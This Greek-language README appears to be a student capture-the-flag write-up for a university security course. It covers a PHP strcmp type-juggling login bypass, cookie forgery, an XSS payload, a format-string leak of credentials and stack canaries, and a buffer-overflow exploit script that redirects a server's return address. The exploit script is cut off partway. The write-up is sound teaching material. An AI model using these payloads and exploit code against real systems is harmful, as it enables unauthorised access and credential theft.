# 2020-project-2-cybergh0sts

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 1 (_Finding George_)

1. Αρχικά, βρήκαμε με **View Page Source**, το σχόλιο που περιείχε το blog με τρόπους ασφάλισης ενός server

   > --> Link: https://blog.0day.rocks/securing-a-web-hidden-service-89d935ba1c1d

<br/>

2. Από εκεί βρήκαμε ότι μπορούμε να χρησιμοποιήσουμε το **/server-info** για να δούμε πληροφορίες 
   σχετικές με τον server

   > --> Link: http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/server-info
    
<br/>
    
3. Έτσι, μέσα στις πληροφορίες αυτές, βρήκαμε ότι στο server εξυπηρετούνται δύο ιστοσελίδες και πήραμε το 2<sup>ο</sup> .onion link

    > ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/1-Served_Links.png) 
    >
    >
    > --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/

<br/>

4. Μετά από το **/server-info** ξανά, του 2<sup>ου</sup> onion, βρήκαμε ότι έχουμε πρόσβαση σε όλα τα **.phps** files

   > ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/2-Extensions_Granted_Access.png)
    
   Παρόμοια πληροφορία μπορούμε να πάρουμε και με ακόμα έναν τρόπο. Μέσα στο **/robots.txt** αναγράφεται το εξής
   
   > Disallow: /\*.phps
   
   που δηλώνει ότι ο server δε θέλει τα Web Robots που θα διαβάσουν αυτό το αρχείο, να επισκεφθούν σελίδες με κατάληξη **.phps**.
   Αυτό άμεσα μας δηλώνει ότι κάπου στο server ενδεχομένως να υπάρχει κάποιο php source file, από το οποίο μπορούμε να δούμε το 
   back end της αντίστοιχης σελίδας. [<sup>[1]</sup>](#1--httpswwwrobotstxtorgrobotstxthtml)

<br/>

5. Μετά, πατώντας το _Submit_ που είχε στη φόρμα, μας ανακατεύθυνε στη σελίδα **/access.php** με μήνυμα λάθους. 
   
   <ul>
   <li>Αρχικά σκεφτήκαμε να προσπαθήσουμε με <b>SQL Injection</b> να αντλήσουμε δεδομένα από τη βάση.</li>
   <li>Στη συνέχεια, εφόσον είδαμε ότι δεν μπορούμε να κάνουνμε κάτι με αυτό το attack, ψάξαμε στο <b>/server-info</b> αυτού του 
      onion και βρήκαμε αυτά που αναφέρονται στο 4.</li>
   <li>Τότε, δοκιμάσαμε να βάλουμε στο url το <b>access.phps</b> και μας εμφάνισε το source code του.</li>
   </ul><br/>
   
   > &emsp;&nbsp;&nbsp; --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.phps
   
<br/>

6. Διαβάζοντας τον κώδικα βρήκαμε πώς να βρούμε το <b>username</b>. Φτιάξαμε το παρακάτω script που το υπολόγιζε και βρήκαμε την τιμή 
   του $user (= 1337) \[leet 😉\]
   
   ```python
   cnt = 0
   i   = 0
   while True:
       if '7' in list(str(i*7)):
           cnt = cnt + 1

       if cnt == 48:
           print(i*7)
           break

       i = i + 1
   ```
   Στη συνέχεια, είδαμε ότι έχει και έναν 2<sup>ο</sup> ελεγχο που πρέπει να παρακάμψουμε. Έπρεπε το μήκος του username να είναι ίσο με 
   **7**. Έτσι απλά προσθέσαμε **3** χαρκατήρες + οι οποίοι αγνοούνται και περάσαμε τον πρώτο έλεγχο.
   
   <h6> <i> Σημείωση: Οποιουσδήποτε 3 χαρακτήρες και να βάλουμε που είναι γράμματα και όχι ψηφία περνάμε τον έλεγχο. </i> </h6>

<br/>

7. Μετά είδαμε ότι, για να πιστοποιηθεί το $password, χρησιμοποιείται μια **strcmp()**, της οποίας το ένα εκ των δύο ορισμάτων το 
   ελέγχουμε εμείς. 
   
   Ακόμα, ο έλεγχος που κάνει η php για το αποτέλεσμα της `strcmp()`, είναι **loose comparison (!=)** και όχι **strict (!==)**, 
   που σημαίνει ότι μπορεί να παρακαμφθεί πολύ πιο εύκολα. Ακολούθως παρατίθενται δύο πίνακες αληθείας για τα δύο είδη συγκρίσεων.
   
   |  |  |
   |--|--|
   | ![alt_text](https://hydrasky.com/wp-content/uploads/2017/05/strict-comparison.png) | ![alt_text](https://hydrasky.com/wp-content/uploads/2017/05/loose-comparison.png) |
   
   <!-- <h4> <b> Strict Comparison Mode (=== , !===) </b> </h4> -->
   
   <!-- |        | TRUE  | FALSE |   1   |   0   |  -1   |  "1"  |  "0"  | "-1"  | NULL  | array() | "php" |  ""   |
   |--------|-------|-------|-------|-------|-------|-------|-------|-------|-------|---------|-------|-------|
   |**TRUE**    | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |**FALSE**   | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |1       | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |0       | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |-1      | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"1"     | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"0"     | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"-1"    | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE |  FALSE  | FALSE | FALSE |
   |**NULL**    | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  FALSE  | FALSE | FALSE |
   |array() | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  **TRUE**   | FALSE | FALSE |
   |"php"   | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | **TRUE**  | FALSE |
   |""      | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | FALSE | **TRUE**  | -->
   
   <!-- <h4> <b> Loose Comparison Mode (== , !==) </b> </h4> -->
   
   <!-- |        | TRUE  | FALSE |   1   |   0   |  -1   |  "1"  |  "0"  | "-1"  | NULL  | array() | "php" |  ""   |
   |--------|-------|-------|-------|-------|-------|-------|-------|-------|-------|---------|-------|-------|
   |**TRUE**    | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | **TRUE**  | FALSE |
   |**FALSE**   | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | **TRUE**  |  TRUE   | FALSE | **TRUE**  |
   |1       | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |0       | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | **TRUE**  |  FALSE  | **TRUE**  | **TRUE**  |
   |-1      | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE |  FALSE  | FALSE | FALSE |
   |"1"     | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"0"     | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE |  FALSE  | FALSE | FALSE |
   |"-1"    | FALSE | FALSE | FALSE | FALSE | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE |  FALSE  | FALSE | FALSE |
   |**NULL**    | FALSE | **TRUE**  | FALSE | ***TRUE***  | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  TRUE   | FALSE | **TRUE**  |
   |array() | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  TRUE   | FALSE | FALSE |
   |"php"   | **TRUE**  | FALSE | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | FALSE |  FALSE  | **TRUE**  | FALSE |
   |""      | FALSE | **TRUE**  | FALSE | **TRUE**  | FALSE | FALSE | FALSE | FALSE | **TRUE**  |  FALSE  | FALSE | **TRUE**  | -->
   
   Όπως φαίνεται εύκολα από το 2<sup>ο</sup> πίνακα, με βάση το **type juggling** που πραγματοποιεί η php, το **NULL** γίνεται evaluated
   ως 0 και έτσι η σύγκριση **NULL == 0** επιστρέφει ***TRUE***. [<sup>\[2\]</sup>](#2--httpsowasporgwww-pdf-archivephpmagictricks-typejugglingpdfpage33)[<sup>\[3\]</sup>](#3--httpswwwdoylernetsecurity-not-includedbypassing-php-strcmp-abctf2016)
   
   Άρα έπρεπε να βρούμε τρόπο να κάνουμε το όρισμα που ελέγχουμε, να μετατραπεί σε **empty array**, καθώς δίνοντας στην `strcmp()` σαν 
   όρισμα τον κενό πίνακα, επιστρέφει **NULL**!
   
   Έτσι, βρήκαμε ότι η php μετατρέπει τα **POST** και **GET** variables της μορφής **pass\[\]=**, σε **Empty Arrays**. 
   
   Συνεπώς, το μόνο που χρειαζόταν για να σπάσουμε τον έλεγχο, ήταν να δώσουμε σαν paylaod: **password\[\]**
   
   Άρα, το ολοκληρωμένο payload που χρειαζόμαστε για να περάσουμε τους ελέγχους είναι: **user=1337+++&password\[\]**
   
   > --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/access.php?user=1337+++&password[]

<br/>

8. Μετά από το **/blogposts7589109238** που μας έδωσε η καινούργια σελίδα, πήγαμε στην **/blogspots** και μέσω του indexing 
   που δεν είχε ασφαλίστει, βρήκαμε το αρχείο **post3.html** που περιείχε την πρώτη αναφορά στον Γιώργο και διάφορα άλλα στοιχεία.

   > --> Link: http://jt4grrjwzyz3pjkylwfau5xnjaj23vxmhskqaeyfhrfylelw4hvxcuyd.onion/blogposts7589109238/blogposts/

<br/>

9. Από εκεί είδαμε να αναφέρεται το εξής: **"Winner Visitor #100013"** και θυμηθήκαμε ότι είχαμε δει το **Visitor** σαν Name στο
   cookie της αρχικής σελίδας (http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/) που μας 
   είχε δοθεί και υποψιαστήκαμε ότι θα χρησιμοποιηθεί κάπου εκεί.
   
   ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/3-Cookie_Name.png)
    
   Διαγράφοντας το cookie που έχει και κάνοντας reload είδαμε ότι στη θέση του 204 εμφανίζει **"Bad sha256"**.
   Τότε σκεφτήκαμε ότι το value του cookie καθορίζει το τι θα εκτυπωθεί στη θέση του 204.
   
   ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/4-Cookie_BadSHA256.png)
   
   Είδαμε ότι το value του cookie τελειώνει σε %3D που είναι το (=) σε URL encoded μορφή και βρήκαμε ότι αυτό
   είναι format που συμφωνεί με την κωδικοποίηση base64. [<sup>\[4\]</sup>](#4--httpsstackoverflowcomquestions6916805why-does-a-base64-encoded-string-have-an-sign-at-the-end)
   
   Κάνοντας decrypt το: **MjA0OmZjNTZkYmM2ZDQ2NTJiMzE1Yjg2YjcxYzhkNjg4YzFjY2RlYTljNWYxZmQwNzc2M2QyNjU5ZmRlMmUyZmM0OWE=** \
   είδαμε ότι παράγει το: **204:fc56dbc6d4652b315b86b71c8d688c1ccdea9c5f1fd07763d2659fde2e2fc49a**
   
   Μετά κάναμε hashing του 204 με το sha-256 και είδαμε ότι παράγει το 2ο κομμάτι του decrypted base64.

   Άρα κατασκευάσαμε εν τέλει το καινούργιο value για το cookie σύμφωνα με τη συνάρτηση: base64( id:sha256(id) )

   Έτσι παράχθηκε το: **MTAwMDEzOjM2MjA5NTQyMzYyNzg3ZjIyMDU0MTgyYzNlNDE0MDlmZDFiMDQ4NmVjYjI4MmMwMmRjNTdiNGY5OGU0N2RlNzA=**

   Βάζοντας το στο cookie, λοιπόν, εμφανίστηκε η κρυφή τοποθεσία του καταλόγου με τα backups από το κινητό του Γιώργου 
   **/sekritbackups2444**.

   > --> Link: http://2fvhjskjet3n5syd6yfg5lhvwcs62bojmthr35ko5bllr3iqdb4ctdyd.onion/sekritbackups2444/
   
   
   #### Bonus!
   
   Ακουλουθώντας την παραπάνω διαδικασία μπορέσαμε και κάναμε **XSS attack** στο site.
   
   Έτσι, με payload: **<script\>alert(1)</script\>**, μετατρέποντας το σε **sha256** και μετά σε **base64**, εμφανίστηκε το alert message
   στη σελίδα.
   
   Payload: **PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjo1YzE0MGQzNWRjYjQ2YTYyMmUyY2VkZjVlZjVjYzM2MzhjZGZmZDFjMTE4YzkzMzFmOGM4NDY2OWYwYjc0Nzgz**

   ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/5-Cookie_XSS.png)
   
<br/>

10. Από το καινούργιο path που βρήκαμε, κατεβάσαμε όλα τα αρχεία.
    
    Βρήκαμε μέσα στο **passphrase.key.truncated**, το πρώτο μέρος του hash του κωδικού με τον οποίο εγινε το _gpg encryption_.
    
    Ακολουθώντας τις οδηγίες, πήραμε το secret **"raccoon"** που αναφερόταν στο 2<sup>ο</sup> onion και δοκιμάσαμε όλες τις ημερομηνίες 
    τελευταίας τροποποίησης των **.truncated** και των υπολοίπων αρχείων και εκείνες που αναφέρονταν στα κείμενα, αλλά επειδή καμία δεν 
    έκανε την αποκρυπτογράφηση, φτιάξαμε το παρακάτω script που έκανε ένα _mini brute force_ με ημερομηνίες από 2020-01-01 -> 2020-06-31
    (καθώς η τελευταία τροποίηση αρχείου αρχείου και των δύο onion είναι στις 2020-06-xx) και βρήκαμε τελικά τη σωστή ημερομηνία.
    
    ```python
    from hashlib import sha256

    for i in range(1,7):
       for j in range(1,32):
          passphrase = "2020-0" + str(i) + "-"

          if j < 10:
             passphrase = passphrase + "0" + str(j)
          else:
             passphrase = passphrase + str(j)
             passphrase = passphrase + " raccoon"
             key = sha256(passphrase.encode('utf8').rstrip()).hexdigest()

             if "d1689c23e86421529297" in key:
                print(passphrase)
                print(key)
                exit()
    ```

    Ελέγχαμε αν το κομμάτι του hash που είχε το _truncated file_ περιέχεται σε αυτό που φτιάξαμε και εύκολα βρίσκουμε
    την ημερομηνία να είναι: **2020-02-12**

    Έτσι έχοντας όλο το passphrase και κάνοντας το hashing μπορούμε να κάνουμε decrypt τα .gpg αρχεία. \
    **passphrase**: 2020-02-12 raccoon \
    **hash**&emsp;&emsp;&nbsp;&nbsp;&nbsp;: d1689c23e86421529297f3eb35db2fe261de9cbe19487d923c464d96ca00e138

<br/>

11. Ανοίγωντας το **signal.log** βρίσκουμε την αναφορά στο commit με αριθμό: **2355437c5f30fd2390a314b7d52fb3d24583ef97**
    
    Παρόλο που σίγουρα κάποιο ρόλο θα διαδραμάτιζε και το **firefox.log**, αρχικά αρχίσαμε να ψάχνουμε τα repos των καθγητών και των 
    βοηθών μέχρι που βρήκαμε το αντίστοιχο commit με το ίδιο hash.
    
    Eν τέλει, προφανώς και υπήρχε και στο αρχείο **firefox.log**, που με ένα `search github` έβγαζε το λινκ απευθείας ή μέσω
    terminal εκτελώντας: `sort firefox.log | uniq` ή `grep github firefox.log`, εμφάνιζε το link του github.

      > \>\> sort firefox.log | uniq \
      >      https://en.wikipedia.org/wiki/The_Conversation \
      >      https://github.com/asn-d6/tor

      > \>\> grep github firefox.log \
      >      https://github.com/asn-d6/tor

<br/>

12. Τέλος, βρίσκοντας το commit αυτό, βρίσκαμε τις τελικές οδηγίες για την εύρεση της τοποθεσίας του Γιώργου. 
    Ακολουθώντας εύκολα πλέον τα 4 βήματα που είχε μέσα κατασκευάσαμε με ένα script τις συντεταγμένες του και ολοκληρώσαμε το ερώτημα!
    
    ```python
    from hashlib import sha256

    key = sha256(b"cybergh0sts").hexdigest()

    x = "0." + str(key[:16])
    y = "0." + str(key[16:32])

    mult = 1/16
    lat  = 0.0
    long = 0.0
    for i in range(2,18):
        lat  = lat  + int(x[i],16) * mult
        long = long + int(y[i],16) * mult
        mult = mult / 16

    print("Latitude : %.30lf"%lat)
    print("Longitude: %.30lf"%long)
    ```

    **Location**&nbsp;&nbsp;: Vaux-Saules, 21440, France\
    **Latitude**&nbsp;&nbsp;&nbsp;: 47.47298416481722560089\
    **Longitude**: &nbsp;&nbsp;4.7991375472458345437

---
---

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 2 (Missing part for completing Plan X)

1. Αρχικά εγκαταστήσαμε τοπικά τον **pico server** και κατά το compilation εμφανίστηκε ένα warning που μας έδωσε το 1<sup>ο</sup> βήμα 
   για το attack που πρέπει να κάνουμε.
   
   &emsp; ![alt text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/6-FSA_Warning.png)
    
<br/>

2. Μετά διαβάζοντας και το αντίστοιχο κομμάτι κώδικα και έπειτα από σχετική αναζήτηση, βρήκαμε ότι ένα πολύ ισχυρό attack που μπορεί να 
   γίνει σε μια τέτοια ***printf***, είναι το **Format String Attack**. [<sup>\[5\]</sup>](#5--httpsowasporgwww-communityattacksformat_string_attack)[<sup>\[6\]</sup>](#6--httpscs155stanfordedupapersformatstring-12pdfpage11)
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/7-Format_String_attack.png)
   
<br/>

3. Μέσω αυτού, μπορούμε να κάνουμε reveal τα περιεχόμενα ολόκληρου του stack. Έτσι, μπορέσαμε να εκτυπώσουμε τα περιεχόμενα του πίνακα 
   που δίνεται σαν όρισμα στην `check_auth()` (Line users\[\]), ο οποίος περιέχει το username και το password που έχει φορτωθεί από το 
   αρχείο **/etc/htpasswd**. 
   
<br/>

4. Μέσω του ***gdb*** βρήκαμε τα offsets που χρειαζόμαστε για να προσπελάσουμε τα περιεχόμενα της θέσης μνήμης στη stack στην οποία είναι 
   αποθηκευμένες οι παραπάνω πληροφορίες.
   
   Είδαμε ότι τα δύο ορίσματα της `check_auth()` αποθηκεύονται από τις θέσεις: **$ebp + 0x8** (***Line users\[\]***) και **$ebp + 0xc** 
   (***auth_header***), στο κάτω μέρος του stack frame της συνάρτησης, στις θέσεις: **$ebp - 0x5c** και **$ebp - 0x60** αντιστοίχως.
   
   <h6>Σημείωση: Το stack frame έχει αρχικοποιηθεί με <b>0x64 = 100 bytes</b></h6>
   
   > ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/8-Arguments_Copy.png)
   
<br/>

5. Στη συνέχεια βρήκαμε, ότι η μεταβλητή **auth_username**, που δίνεται σαν όρισμα στην `printf()` την οποία θα εκμεταλλευτούμε, 
   αποθηκεύεται στη θέση: **$ebp - 0x40**. 
   
   Άρα υπολογίζοντας το **offset** μεταξύ αυτών των θέσεων βρήκαμε ότι βάζοντας σαν payload: **%7$s**, θα μας επιστρέψει το περιεχόμενο
   του πίνακα **users\[\]**.
   
   > ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/9-FSA_Arg_Position.png)
   
<br/>

6. Το αποτέλεσμα του request μας εμφανίζεται στους Mozilla και Tor Browsers στο prompt που δώσαμε, αλλά και στα **Response Headers**.
     
   Έτσι πήραμε το εξής response: **admin:f68762a532c15a8954be87b3d3fc3c31**

   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/10-Prompt_FSA_Results.png)
   
   &emsp; ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/11-Headers_FSA_Results.png)

<br/>

7. Στη συνέχεια μέσω κάποιων online ***md5 databases***, βρήκαμε το decryption του hashed password που είναι: **you shall not pass**.
   
   Έτσι, περάσαμε τον αρχικό έλεγχο και πήραμε το **index.html**, που περιείχε πληροφορίες για το ***Missing Part for Plan X***!
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/12-Plan_X.png)|
   |-|

---
---

## &emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp; Part 3 (Preliminary Results of Plan Y)

1. Αρχικά και εδώ, ξεκινήσαμε δοκιμάζοντας να κάνουμε κάποιο **SQL Injection** για να παρακάμψουμε τον έλεγχο.

2. Στη συνέχεια, ξαναδιαβάζοντας τον κώδικα, είδαμε πως υπάρχει ένας πίνακας **admin_pwd[1]** που έχει το ίδιο όνομα με το όνομα του 
   prompt που υπάρχει στη σελίδα του 3<sup>ου</sup> .onion link.
   
   Βλέποντας και το περιεχόμενο της συνάρτησης `post_param()` που καλείται αμέσως μετά, είδαμε ότι γίνεται ένα ***memcpy*** με μέγεθος όσο
   το εκάστοτε payload και παράλληλα μετατρέπονται τα **&**,**=** σε **\0** χαρακτήρες. Έτσι, καταλάβαμε ότι πρέπει να κάνουμε **Buffer Overflow**!
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/13-Prompt_Name.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/14-Pico_SameName_Array.png)|
   |-|-|
<br/>

3. Πρώτα έπρεπε να βρούμε τις μεθόδους ασφαλείας που χρησιμοποιεί ο server, πληροφορίες σχετικές με το πώς έγινε το build και πληροφορίες για
   το σύστημα στο οποίο έγινε. 
   
   Διαβάζοντας το Makefile είδαμε ότι δε γίνεται κάποια απενεργοποίηση των **stack-protectors (canaries)**, του **ASLR** και ενεργοποίηση του 
   **Executable Stack** οπότε καταλάβαμε ότι θα ήταν ενεργοποιημένα.
   
   - Mέσω του gdb επιβεβαιώσαμε ότι χρησιμοποιούνται **canaries** για να διασφαλιστούν οι συναρτήσεις που περιέχουν πίνακες και μάλιστα 
     χρησιμοποιούνται ***Random Terminator Canaries*** που προσφέρουν μεγαλύτερη ασφάλεια όταν γίνεται χρήση κάποιας `strcpy()`.
   
   - Κάνοντας 2-3 φορές το **Format String Attack (FSA)** που περιγράφηκε στο Part_2, επιβεβαιώσαμε και την ύπαρξη του **ASLR**.
   
   - Στη δελίδα που μπήκαμε περνόντας το Βήμα 2, περιέχονταν πληροφορίες σχετικές με το σύστημα στο οποίο έγινε το build του pico server, της 
     έκδοσης του gcc που χρησιμοποιήθηκε και το όνομα του μηχανήματος στο οποίο έγινε.
     
     |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/15-Pico_Server_Build_Info.png)|
     |-|
     
   - Πηγαίνοντας στο μηχάνημα **linux02**, μέσω της εντολής `lscpu` βρήκαμε ότι πρόκειται για ***Little Endian*** σύστημα.
   
     ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/16-System_Endian.png)
     
<br/>

4. Οι πρώτες σκέψεις, ήταν με το BOF να κάνουμε override το περιεχόμενο του πίνακα **admin_pwd[1]** και να γράψουμε μέσα έναν δικό μας κωδικό
   τον οποίο και θα επέστρεφε η `post_param()` για να καταφέρουμε να περάσουμε τον έλεγχο που έχει στη συνέχεια.
   
   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/17-Password_Checking.png)
<br/>

5. Έπειτα είδαμε ότι μπορούμε να κάνουμε κάτι πιο εύκολο στην υλοποίηση, όπως το να αλλάξουμε τη διεύθυνση επιστροφής της `post_param()` και να 
   την πάμε στο σημείο που εμείς θέλουμε. Εν προκειμένω, να καλέσουμε την **`serve_ultimate()`** ώστε να μας στείλει το _ultimate.html_.
<br/>

6. Στην αρχή προσπαθήσαμε να βρούμε τρόπο να παρακάμψουμε τα ***canaries***. \
   Σκεφτήκαμε ότι στην έκδοση gcc-5.4 υπάρχουν γνωστά vulnerabilities που θα μπορούσαμε να εκμεταλλευτούμε. [<sup>\[7\]</sup>](#7--httpswwwcvedetailscomvulnerability-listvendor_id-72product_id-960version_id-219995gnu-gcc-54html) \
   Βρήκαμε ότι όντως υπάρχει ένα security vulnerability το οποίο θα μας επέτρεπε να περάσουμε τον έλεγχο του stack guard canary.
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/18-GCC_5.4_Security_Vulnerability.png)|
   |-|
<br/>

7. Στη συνέχεια σκεφτήκαμε πως εφόσον βρισκόμαστε σε **x32** αρχιτεκτονική τότε θα μπορούσαμε να κάνουμε _brute force_ ώστε να βρούμε την τιμή 
   του και να την επαναφέρουμε μέσω του BOF για να μην προκύψει ***stack smashing***, κάτι που ενισχύεται δεδομένου ότι έχουμε να κάνουμε με 
   **Termiantor Canaries** (eg. 0xYYYYYY**00**), που σημαίνει ότι μειώνεται ακόμα περισσότερο ο χώρος αναζήτησης του _brute forcing_ [<sup>\[8\]</sup>](#8--httpsctf101orgbinary-exploitationstack-canariesbruteforcing-a-stack-canary)
   
   Έτσι κάνοντας brute force byte per byte, θα χρειαζόμασταν το πολύ 3\*255 = **765** προσπάθεις, κάτι που είναι αποδεκτό για ένα τέτοιο attack.
<br/>

8. Ωστόσο, υπάρχουν και άλλοι πιο εύκολοι τρόποι για να επιτευχθεί το παρόν attack και γι'αυτό συνεχίσαμε χωρίς να εκμεταλλευτούμε το παραπάνω κενό 
   ή κάνοντας brute force.
   
   Μέσω του gdb και μετά από σχετική αναζήτηση, βρήκαμε ότι τα συγκεκριμένα canaries είναι **Random Terminator Canaries** και έτσι καταλάβαμε το
   πως λειτουργούν και πως θα μπορούσαμε να τα κάνουμε bypass. [<sup>\[9\]</sup>](#9--httpsenwikipediaorgwikiBuffer_overflow_protectioncanaries)[<sup>\[10\]</sup>](#10--httpswwwusenixorglegacypublicationslibraryproceedingssec98full_paperscowancowanpdf)[<sup>\[11\]</sup>](#11--httpstaffustceducnbjhuacoursessecurity2014readingsstackguard-bypasspdf)[<sup>\[12\]</sup>](#12--httpsuafioexploitation20150929Stack-CANARY-Overwrite-Primerhtml)
   
   Βρήκαμε δηλαδή ότι παράγονται κατά το initialization του server και παραμένει ίδιο για κάθε κλήση συνάρτησης που περιέχει κάποιον πίνακα.
   
   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/19-Random_Terminator_Canaries.png)
   
   Αυτό άμεσα δηλώνει ότι μπορούμε να κάνουμε leak την τιμή του canary της **`check_auth()`** μέσω του **FSA** που μπορούμε να κάνουμε εκεί και να το 
   χρησιμοποιήσουμε για να "επαναφέρουμε" την τιμή του canary της **`post_param()`**.
   
   Έτσι, διαβάζοντας την assembly μέσω του gdb βρήκαμε ότι το canary αποθηκεύεται στη θέση **$ebp - 0xC**. 
   
   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/20-Stored_Canary.png)
   
   Γι'αυτό έπρεπε να υπολογίσουμε το **offset** από τη μεταβλητή ***auth_username*** η οποία χρησιμοποιείται για το **FSA**. \
   Αρχικά, βρήκαμε το offset μεταξύ του **ορίσματος** της `printf()` και του **ebp** της `check_auth()`, που είναι ίσο με: **0x78 = 30\*4 = 120 bytes**. \
   Αρα, ξέραμε άμεσα ότι το canary βρίσκεται **0xC** bytes πιο χαμηλά από τον ebp, αρα είχαμε το offset ίσο με: **0x6C = 27\*4 = 108 bytes = **.
   
   Έτσι, κάνοντας αρχικά ένα request οπως αυτό του Part_2 με payload: **%27$x** παίρνουμε την τιμή του canary!
   
   ![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/21-Canary_Value.png)

<br/>

9. Επειτα, υπολογίσαμε το offset της διεύθυνσης της εντολής που καλεί την **`serve_ultimate()`** από την πραγματική _return address_ της `check_auth()`, 
   το οποίο είναι ίσο με: **0x145**. _(Παρακάτω παρατίθεται και ο σχετικός κώδικας που κάνει το attack)_
   
   |![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/22-Check_Auth_Ret.png)|![alt_text](https://github.com/chatziko-ys13/2020-project-2-cybergh0sts/blob/master/img/23-Call_Serve_Ultimate.png)|
   |-|-|
   
   Στην αρχή πηγαίναμε στο Tor και παίρναμε τα δεδομένα που χρειαζόμασταν μέσω του **FSA**, έπειτα φτιάχναμε το payload σε binary μορφή, το αποθηκεύαμε 
   σε αρχείο και χρησιμοποιούσαμε το **Postman** για να κάνουμε το request, αλλά στη συνέχεια αυτοματοποιήσαμε όλη τη διαδικασία φτιάχνοντας ένα python script.
   
   ```python
   ...
   binary_payload = BytesIO()
   binary_payload.write(("p" * 100).encode("utf-8"))
   binary_payload.write(canary)
   binary_payload.write(("p" * 8).encode("utf-8"))
   binary_payload.write(svd_ebp)
   binary_payload.write(srv_ulti)
   ...
   ```
   
   <details>
   <summary><b>Click here to see the full script</b></summary>
      <p>

      ```python
      import struct
      import base64
      import requests

      from sys import argv
      from io  import BytesIO

      # Sending 1st payload to / for getting the canary value and
      # the return address of check_auth() from reposnse headers
      url = 'http://localhost:' + argv[1] + '/'

      username_payload64 = base64.b64encode(bytes('%27$x %30$x %31$x', 'utf-8'))
      input_headers = {'Authorization': 'Basic ' + username_payload64.decode('UTF-8')}
      response = requests.request("GET", url, headers=input_headers)
      text_obj = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

      # Building the payload
      canary   = text_obj[-3]
      ebp      = text_obj[-2]
